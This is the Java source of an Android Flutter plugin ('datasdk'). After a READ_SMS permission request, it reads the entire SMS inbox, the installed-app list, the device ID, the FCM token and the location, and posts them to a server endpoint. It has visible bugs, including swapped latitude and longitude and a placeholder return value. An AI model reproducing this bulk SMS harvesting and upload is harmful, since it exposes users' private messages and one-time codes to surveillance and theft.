
package com.xuriti.datasdk;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import io.flutter.embedding.engine.plugins.FlutterPlugin;
import io.flutter.embedding.engine.plugins.activity.ActivityAware;
import io.flutter.embedding.engine.plugins.activity.ActivityPluginBinding;
import io.flutter.plugin.common.MethodCall;
import io.flutter.plugin.common.MethodChannel;
import io.flutter.plugin.common.MethodChannel.MethodCallHandler;
import io.flutter.plugin.common.MethodChannel.Result;
import io.flutter.plugin.common.PluginRegistry;

/** DatasdkPlugin */
public class DatasdkPlugin implements FlutterPlugin, MethodCallHandler, ActivityAware, PluginRegistry.RequestPermissionsResultListener {
  /// The MethodChannel that will the communication between Flutter and native Android
  ///
  /// This local reference serves to register the plugin with the Flutter Engine and unregister it
  /// when the Flutter Engine is detached from the Activity
  private MethodChannel channel;
  private Context context;
  private Activity activity;
  private   Boolean permissionGranted;
  private String userid;
  private String output;
  private String baseUrl;
  private LocationManager locationManager;
  private  String latitude;
  private String longitude;
  private String fcmtoken;
  private Result finalResult;

  @Override
  public void onAttachedToEngine(@NonNull FlutterPluginBinding flutterPluginBinding) {
    channel = new MethodChannel(flutterPluginBinding.getBinaryMessenger(), "datasdk");
    context = flutterPluginBinding.getApplicationContext();

    channel.setMethodCallHandler(this);
  }

  @Override
  public void onMethodCall(@NonNull MethodCall call, @NonNull Result result) {
    finalResult =result;
    if (call.method.equals("getPlatformVersion")) {
      result.success("Android " + android.os.Build.VERSION.RELEASE);
    } else if(call.method.equals("getAppData")){
      //Log.d("METHOD","CALLED");
      userid = call.argument("userid");
     // Log.d("USERID",userid);

      baseUrl = call.argument("baseurl");
      //Log.d("BASEURL",baseUrl);
      latitude = call.argument("lat");
      longitude= call.argument("long");
      //Log.d(latitude,longitude);
      fcmtoken = call.argument("fcmtoken");
      permissionGranted = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS)== PackageManager.PERMISSION_GRANTED;
    if(!permissionGranted){
      String[] permissions = new String[1];
      permissions[0] = Manifest.permission.READ_SMS;
//      permissions[1] = permission.ACCESS_COARSE_LOCATION;
//      permissions[2]= permission.ACCESS_FINE_LOCATION;
      ActivityCompat.requestPermissions(activity, permissions,123);
    }else {
      //getLocation();
      output =  getUserData();
      //Log.d("RES",output);
    }
    //result.success("GG");
    }
  }
  @Override
  public void onAttachedToActivity(@NonNull ActivityPluginBinding binding) {
    activity = binding.getActivity();
  }

  @Override
  public void onDetachedFromActivityForConfigChanges() {

  }

  @Override
  public void onReattachedToActivityForConfigChanges(@NonNull ActivityPluginBinding binding) {

  }

  @Override
  public void onDetachedFromActivity() {

  }

  @Override
  public void onDetachedFromEngine(@NonNull FlutterPluginBinding binding) {
    channel.setMethodCallHandler(null);
  }

  @Override
  public boolean onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
    boolean b = grantResults[0] == PackageManager.PERMISSION_GRANTED;
    if(b){
      output = getUserData();
      Log.d("RES",output);
      return true;
    }

    return false;
  }
  public ArrayList<String> getallapps() {
    // get list of all the apps installed
    List<PackageInfo> packList = activity.getPackageManager().getInstalledPackages(0);
    ArrayList<String> apps = new ArrayList<String>();
    for (int i = 0; i < packList.size(); i++) {
      PackageInfo packInfo = packList.get(i);
      try {
        apps.add( packInfo.applicationInfo.loadLabel(activity.getPackageManager()).toString());
      }catch (Resources.NotFoundException e){
        Log.e("ERROR",e.getLocalizedMessage());
      }
    }
   // Log.d("APPS",apps.toArray().toString() );
    return apps;
    // set all the apps name in list view
//        listView.setAdapter(new ArrayAdapter<String>(MainActivity.this, android.R.layout.simple_list_item_1, apps));
//        // write total count of apps available.
//        text.setText(packList.size() + " Apps are installed");
  }
  public ArrayList getAllSmsFromProvider() throws JSONException {
    ArrayList<String> lstSms = new ArrayList<String>();
    ArrayList<String> body = new ArrayList<String>();
    Uri smsUri = Uri.parse("content://sms/inbox");
    Cursor cursor = activity.getContentResolver().query(smsUri, null, null, null, null);
    StringBuilder builder = new StringBuilder();
    ArrayList<JSONObject> smslist= new ArrayList<JSONObject>();
    while (cursor.moveToNext()) {

      //Log.d("_id",cursor.getString(cursor.getColumnIndex()));

      @SuppressLint("Range") String label = cursor.getString(cursor.getColumnIndex("address"));
      @SuppressLint("Range") String bdy =  cursor.getString(cursor.getColumnIndex("body"));
      body.add(bdy);
      lstSms.add(label);
      JSONObject jsonObject  = new JSONObject();
      jsonObject.put("label",label);
      jsonObject.put("body",bdy);
      smslist.add(jsonObject);
    }



    return smslist;
  }
  public String getUserData(){
    //Log.d("METHOD","USERDATA");

    ArrayList<String> apps= getallapps();
    ArrayList<JSONObject> sms_data = new ArrayList<>();
    try {
      sms_data = getAllSmsFromProvider();
    } catch (JSONException e) {
      e.printStackTrace();
    }
    JSONObject resultObject = new JSONObject();
    try {
      resultObject.put("APPDATA",apps);
      resultObject.put("SMSDATA" ,sms_data);
    } catch (JSONException e) {
      e.printStackTrace();
    }
    //Log.d("HH","HELLO");
    //Log.d("RESULT",resultObject.toString());
    String res=apiCall();
    return  res ;
  }
  private String apiCall(){
   // Log.d("METHOD","APICALLL");


    ArrayList<String> apps= getallapps();
    String URL = baseUrl+"/api/user/userdata";
    String time = String.valueOf(System.currentTimeMillis());    RequestQueue requestQueue = Volley.newRequestQueue(context);
    JSONObject locationFootprint = new JSONObject();
    JSONObject deviceDetails = new JSONObject();
    String uid = Settings.Secure.getString(activity.getContentResolver(),Settings.Secure.ANDROID_ID);
    try {
      deviceDetails.put("fcm_token",fcmtoken);
      deviceDetails.put("uuid",uid);
      locationFootprint.put("longitude",latitude);

      locationFootprint.put("latitude",longitude);
      locationFootprint.put("timestamp",time);
    } catch (JSONException e) {
      e.printStackTrace();
    }

    JSONObject reqBody = new JSONObject();
    ArrayList<JSONObject> sms_data = new ArrayList<>();
    try {
      sms_data = getAllSmsFromProvider();
    } catch (JSONException e) {
      e.printStackTrace();
    }
    try {
      String result ;
      reqBody.put("userId",userid);
      reqBody.put("appList",apps);
      reqBody.put("smsData",sms_data);
      reqBody.put("geolocationFootprint",locationFootprint);
      reqBody.put("deviceDetails",deviceDetails);
      JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(Request.Method.POST, URL, reqBody, new Response.Listener<JSONObject>() {
        @Override
        public void onResponse(JSONObject response) {
          Log.d("API",response.toString());
          finalResult.success("SUCCESS");
        }
      }, new Response.ErrorListener() {
        @Override
        public void onErrorResponse(VolleyError error) {
          Log.d("API",error.toString());

          finalResult.success("ERROR");
        }
      });
      requestQueue.add(jsonObjectRequest);
    } catch (JSONException e) {
    Log.d("EXECP",e.toString());
      e.printStackTrace();
    }

      return "HI";


  }

}
